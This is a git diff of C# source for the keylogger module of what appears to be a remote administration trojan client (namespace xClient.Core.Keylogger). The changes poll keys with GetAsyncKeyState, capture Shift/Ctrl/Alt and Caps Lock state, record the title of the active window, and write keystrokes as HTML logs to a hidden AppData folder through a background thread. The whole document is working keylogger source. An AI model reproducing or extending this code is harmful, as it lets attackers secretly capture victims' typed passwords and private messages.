@@ -3,10 +3,20 @@ using System.Collections.Generic;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace xClient.Core.Keylogger
 {
+    public class KeyData
+    {
+        public short Value { get; set; }
+        public bool ShitKey { get; set; }
+        public bool CapsLock { get; set; }
+        public bool ControlKey { get; set; }
+        public bool AltKey { get; set; }
+    }
+
     public class Logger
     {
         #region "WIN32API"
@@ -55,6 +65,22 @@ namespace xClient.Core.Keylogger
             }
         }
 
+        private static bool ControlKey
+        {
+            get
+            {
+                return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); //Returns true if shiftkey is pressed
+            }
+        }
+
+        private static bool AltKey // not working
+        {
+            get
+            {
+                return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); //Returns true if shiftkey is pressed
+            }
+        }
+
         private static bool CapsLock
         {
             get
@@ -63,15 +89,15 @@ namespace xClient.Core.Keylogger
             }
         }
 
-        private StringBuilder _keyBuffer;
+        private StringBuilder _logFileBuffer;
         private string _hWndTitle;
         private string _hWndLastTitle;
 
         private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                             "\\Logs\\";
 
-        private readonly List<int> _enumValues;
-        private IntPtr _activeKeyboardLayout;
+        private readonly List<short> _enumValues;
+        private volatile List<KeyData> _keyBuffer;
         private readonly System.Timers.Timer _timerLogKeys;
         private readonly System.Timers.Timer _timerFlush;
 
@@ -82,7 +108,9 @@ namespace xClient.Core.Keylogger
 
             WriteFile();
 
-            _enumValues = new List<int>()
+            _keyBuffer = new List<KeyData>();
+
+            _enumValues = new List<short>()
                 //Populate enumValues list with the Virtual Key Codes of the keys we want to log
             {
                 8, //Backspace
@@ -92,84 +120,143 @@ namespace xClient.Core.Keylogger
                 46, //Delete
             };
 
-            for (int i = 48; i <= 57; i++) //0-9 regular
+            for (short i = 48; i <= 57; i++) //0-9 regular
             {
                 _enumValues.Add(i);
             }
 
-            for (int i = 65; i <= 122; i++)
-                //65-90 are the key codes for A-Z, skip 91-94 which are LWin + RWin keys, Applications and sleep key, 95-111 numpad keys, 112-122 are F1-F11 keys
+            for (short i = 65; i <= 122; i++)
+                //65-90 A-Z
+                //91-92 LWin + RWin key
+                //skip 93-94 Applications and sleep key
+                //95-111 numpad keys, 112-122 F1-F11 keys
             {
-                if (i >= 91 && i <= 94)
-                    continue;
-
+                if (i >= 93 && i <= 94) continue;
                 _enumValues.Add(i);
             }
 
-            for (int i = 186; i <= 192; i++)
+            for (short i = 186; i <= 192; i++)
                 //186 VK_OEM_1, 187 VK_OEM_PLUS, 188 VK_OEM_COMMA, 189 VK_OEM_MINUS, 190 VK_OEM_PERIOD, 191 VK_OEM_2, 192 VK_OEM_3
             {
                 _enumValues.Add(i);
             }
 
-            for (int i = 219; i <= 222; i++) //219 VK_OEM_4, 220 VK_OEM_5, 221 VK_OEM_6, 222 VK_OEM_7
+            for (short i = 219; i <= 222; i++) //219 VK_OEM_4, 220 VK_OEM_5, 221 VK_OEM_6, 222 VK_OEM_7
             {
                 _enumValues.Add(i);
             }
 
             this._timerLogKeys = new System.Timers.Timer {Enabled = false, Interval = 10};
             this._timerLogKeys.Elapsed += this.timerLogKeys_Elapsed;
+            
+            EmptyKeyBuffer();
 
             this._timerFlush = new System.Timers.Timer {Enabled = false, Interval = flushInterval};
             this._timerFlush.Elapsed += this.timerFlush_Elapsed;
 
-            this._keyBuffer = new StringBuilder();
+            this._logFileBuffer = new StringBuilder();
+        }
+
+        private string HighlightpecialKey(string name)
+        {
+            return string.Format("<font color=\"0000FF\">[{0}]</font>", name);
+        }
+
+        private void EmptyKeyBuffer()
+        {
+            new Thread(() =>
+            {
+                while (this.Enabled)
+                {
+                    Thread.Sleep(500);
+                    int j = 0;
+                    KeyData[] keybuffer = new KeyData[_keyBuffer.Count];
+                    _keyBuffer.CopyTo(keybuffer);
+                    foreach (var k in keybuffer)
+                    {
+                        switch (k.Value)
+                        {
+                            case 8:
+                                _logFileBuffer.Append(HighlightpecialKey("Back"));
+                                break;
+                            case 9:
+                                _logFileBuffer.Append(HighlightpecialKey("Tab"));
+                                break;
+                            case 13:
+                                _logFileBuffer.Append(HighlightpecialKey("Enter"));
+                                break;
+                            case 32:
+                                _logFileBuffer.Append(" ");
+                                break;
+                            case 46:
+                                _logFileBuffer.Append(HighlightpecialKey("Del"));
+                                break;
+                            case 91:
+                            case 92:
+                                _logFileBuffer.Append(HighlightpecialKey("Win"));
+                                break;
+                            case 112:
+                            case 113:
+                            case 114:
+                            case 115:
+                            case 116:
+                            case 117:
+                            case 118:
+                            case 119:
+                            case 120:
+                            case 121:
+                            case 122:
+                                _logFileBuffer.Append(HighlightpecialKey("F" + (k.Value - 111)));
+                                break;
+                            default:
+                                if (_enumValues.Contains(k.Value))
+                                {
+                                    if (k.AltKey && k.ControlKey && k.ShitKey)
+                                    {
+                                        _logFileBuffer.Append(HighlightpecialKey("SHIFT-CTRL-ALT-" + FromKeys(k.Value, k.ShitKey, k.CapsLock)));
+                                    }
+                                    if (k.AltKey && k.ControlKey && !k.ShitKey)
+                                    {
+                                        _logFileBuffer.Append(HighlightpecialKey("CTRL-ALT-" + FromKeys(k.Value, k.ShitKey, k.CapsLock)));
+                                    }
+                                    if (k.AltKey && !k.ControlKey)
+                                    {
+                                        _logFileBuffer.Append(HighlightpecialKey("ALT-" + FromKeys(k.Value, k.ShitKey, k.CapsLock)));
+                                    }
+                                    if (k.ControlKey && !k.AltKey)
+                                    {
+                                        _logFileBuffer.Append(HighlightpecialKey("CTRL-" + FromKeys(k.Value, k.ShitKey, k.CapsLock)));
+                                    }
+                                    else
+                                    {
+                                        _logFileBuffer.Append(FromKeys(k.Value, k.ShitKey, k.CapsLock));
+                                    }
+                                }
+                                break;
+                        }
+                        j++;
+                    }
+                    _keyBuffer.RemoveRange(0, j);
+                }
+            }).Start();
         }
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
-
-            _activeKeyboardLayout = GetActiveKeyboardLayout(); //Get active thread keyboard layout
-
-            foreach (int i in _enumValues) //Loop through our enumValues list populated with the keys we want to log
+            foreach (short i in _enumValues) //Loop through our enumValues list populated with the keys we want to log
             {
                 if (GetAsyncKeyState(i) == -32767) //GetAsycKeyState returns -32767 to indicate keypress
                 {
+                    _keyBuffer.Add(new KeyData() {CapsLock = CapsLock, ShitKey = ShiftKey, ControlKey = ControlKey, AltKey = AltKey, Value = i});
+                    _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
                     if (_hWndTitle != null)
                     {
-                        if (_hWndTitle != _hWndLastTitle)
-                            //Only write title to log if a key is pressed that we support in our enumValues list, we don't want to write the title to a log with blank characters to follow
+                        if (_hWndTitle != _hWndLastTitle && _enumValues.Contains(i))
+                            //Only write title to log if a key is pressed that we support
                         {
                             _hWndLastTitle = _hWndTitle;
-
-                            _keyBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
+                            _logFileBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
                         }
-                    }
-
-                    switch (i)
-                    {
-                        case 8:
-                            _keyBuffer.Append("<font color=\"0000FF\">[Back]</font>");
-                            return;
-                        case 9:
-                            _keyBuffer.Append("<font color=\"0000FF\">[Tab]</font>");
-                            return;
-                        case 13:
-                            _keyBuffer.Append("<font color=\"0000FF\">[Enter]</font><br>");
-                            return;
-                        case 32:
-                            _keyBuffer.Append(" ");
-                            return;
-                        case 46:
-                            _keyBuffer.Append("<font color=\"0000FF\">[Del]</font>");
-                            return;
-                    }
-
-                    if (_enumValues.Contains(i)) //If our enumValues list contains to current key pressed
-                    {
-                        _keyBuffer.Append(FromKeys(i, ShiftKey, CapsLock));
-                        return;
                     }
                 }
             }
@@ -177,7 +264,7 @@ namespace xClient.Core.Keylogger
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_keyBuffer.Length > 0)
+            if (_logFileBuffer.Length > 0)
                 WriteFile();
         }
 
@@ -207,13 +294,13 @@ namespace xClient.Core.Keylogger
                                     "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                     DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");
 
-                                if (_keyBuffer.Length > 0)
-                                    sw.Write(_keyBuffer);
+                                if (_logFileBuffer.Length > 0)
+                                    sw.Write(_logFileBuffer);
 
                                 _hWndLastTitle = string.Empty;
                             }
                             else
-                                sw.Write(_keyBuffer);
+                                sw.Write(_logFileBuffer);
                         }
                         catch
                         {
@@ -225,7 +312,7 @@ namespace xClient.Core.Keylogger
             {
             }
 
-            _keyBuffer = new StringBuilder();
+            _logFileBuffer = new StringBuilder();
         }
 
         private string GetActiveWindowTitle()
@@ -259,7 +346,7 @@ namespace xClient.Core.Keylogger
 
             var sb = new StringBuilder(10);
 
-            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, _activeKeyboardLayout) == 1
+            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, GetActiveKeyboardLayout()) == 1
                 ? (char?) sb[0]
                 : null;
                 //Get the appropriate unicode character from the state of keyboard and from the Keyboard layout (language) of the active thread
